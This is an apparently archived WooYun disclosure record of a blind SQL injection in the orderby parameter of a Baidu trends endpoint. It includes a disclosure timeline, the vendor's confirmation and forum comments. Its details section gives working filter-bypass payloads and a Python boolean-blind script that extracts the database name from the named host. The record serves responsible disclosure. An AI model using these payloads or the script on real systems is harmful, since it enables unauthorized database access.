{"id": 87378, "wybug_id": "wooyun-2016-0197963", "wybug_title": "百度某分站存在SQL注入漏洞(orderby注射技巧)                                      ", "wybug_corp": "百度", "wybug_author": "蓝冰", "wybug_date": "2016-04-18 22:21", "wybug_open_date": "2016-06-03 10:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-03：\t细节向公众公开  简要描述： 测试扫描器 结果没有识别出来 查看请求信息直觉有漏洞妈蛋 高兴不起来啊注入点确实有点蛋疼 详细说明：  \nPOST: http://trends.baidu.com/tour/ajax/scenic\n\nprovinceId=26&timestamp=1437191757000&orderby=heat,desc\norderby参数存在注入这里的逗号会被替换成空格 也就是order by heat desc所以不能带逗号 然后heat这个点不存在注入点 desc处是存在的因为不能带逗号所以不能形成如下的注入语句\norder by id desc,if((116>115),1,(select 1 from information_schema.tables))\n\norder by id,if(1=1,1,(select 1 from information_schema.tables))\n经过测试发现可用如下payload\nheat,rlike case when (1=1) then 1 else char(40) end\n因为不支持0x28这种格式所以换成char(40)1=1时正常1=2时异常形成bool盲注\nimport urllibimport urllib2import httplibimport timeuser = ''for i in range(1,7):    for j in range(32,127):        values = {'provinceId':'26','timestamp':'1437191757000','orderby':'heat,rlike case when (ascii(mid(database()from('+str(i)+')for(1)))='+str(j)+') then 1 else char(40) end'}        data = urllib.urlencode(values)        req = urllib2.Request(\"http://trends.baidu.com/tour/ajax/scenic\",data)        response = urllib2.urlopen(req)        html =  response.read()        if html.find('\"status\":403')==-1:            user = user + chr(j)            print 'Database is : '+user            break\n因为貌似有负载均衡导致user()长度一直会变化@后面的ip地址也随之变化 所以这里只注database()只过滤了逗号 绕过注出所有数据无压力 我就不深入了\nheat,rlike case when (select count(1) from information_schema.tables limit 1 offset 0)>0 then 1 else char(40) end\n返回正常 仅证明到这 都懂的   漏洞证明：  已证明   修复方案：  过滤   版权声明：转载请注明来源 蓝冰@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2016-04-19 10:34 厂商回复： 感谢您关注百度安全！问题分析的细致。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-18 22:35 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:399 漏洞数:97        | 哇啦啦啦啦啦 我的宝贝  |  Tr3jer@Gmail.c...)\t\t \n  蓝冰    \n     2016-04-18 23:12 |    \t\tdepycode \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:52        | 关注网络安全，提高技术！)\t\t \n  黑客    \n     2016-04-19 08:00 |    \t\thear7v \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:22        | 求组织收留啊)\t\t \n  大牛，求交往    \n     2016-04-19 08:06 |    \t\tB1gstar \t\t\t( 实习白帽子  |\t\t\t        Rank:78 漏洞数:13        | 向各位学习来了。)\t\t \n  @depycode 补天带头大哥 你好    \n     2016-04-19 08:44 |    \t\tDotaer \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:6        | 多学习，多挖洞！)\t\t \n  大牛，收徒吗？端茶倒水我都会！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}